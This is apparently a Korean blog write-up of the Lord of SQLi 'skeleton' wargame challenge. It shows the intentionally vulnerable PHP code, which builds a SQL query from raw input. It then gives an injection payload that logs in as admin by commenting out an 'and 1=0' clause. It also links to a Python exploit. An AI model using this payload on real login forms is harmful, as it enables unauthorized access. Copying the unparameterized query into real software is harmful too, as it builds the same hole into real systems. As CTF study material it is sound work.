---
layout: post
title: "LoS skeleton"
author: "isanghyeon"
tags: wargame
---

|문제 명|풀이 여부|URL|
|:------:|:---:|:-----:|
| **skeleton** | <span style="color:red">O</span> | https://los.rubiya.kr/chall/vampire_e3f1ef853da067db37f342f3a1881156.php |

<hr/><br>

### Challenge Source Code
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_skeleton where id='guest' and pw='{$_GET[pw]}' and 1=0"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id'] == 'admin') solve("skeleton"); 
  highlight_file(__FILE__); 
?>
```

<br>

### Analysis Source Code
- #### preg_match function for $_GET[pw]
> ```php 
> preg_match('/prob|_|\.|\(\)/i', $_GET[pw])
> ```
- #### Solve Conditions
> ```php
> if($result['id'] == 'admin') solve("skeleton"); 
> ```

|query|parms1|parms1|
|:--:|:--:|:--:|
|select id from prob_skeleton where id='guest' and pw='{$_GET[pw]}' and 1=0|id='guest'|pw='{$_GET[pw]}'|

특정 query가 삽입되었을 때 반환 array 의 'id' 인덱스의 값이 'admin'일 경우 solve 된다.  
또한, ``` and 1=0 ``` 의 구문으로 어떤 query가 삽입되어도 거짓이 되기 때문에 주석처리로 해당 구문을 삭제한다.  
문제 풀이에 사용된 예시 query는 다음과 같다.  
```sql
sselect id from prob_skeleton where id='guest' and pw='' or id='admin'#' and 1=0
```
<hr/>
<br>

### Exploit Source Code
|작성 언어|Exploit Link|How to Exploit|
|:------:|:---:|:--:|
| **Python3.8** | https://github.com/isanghyeon/LordofSQLi-Solved-Exploit/tree/master/skeleton |  |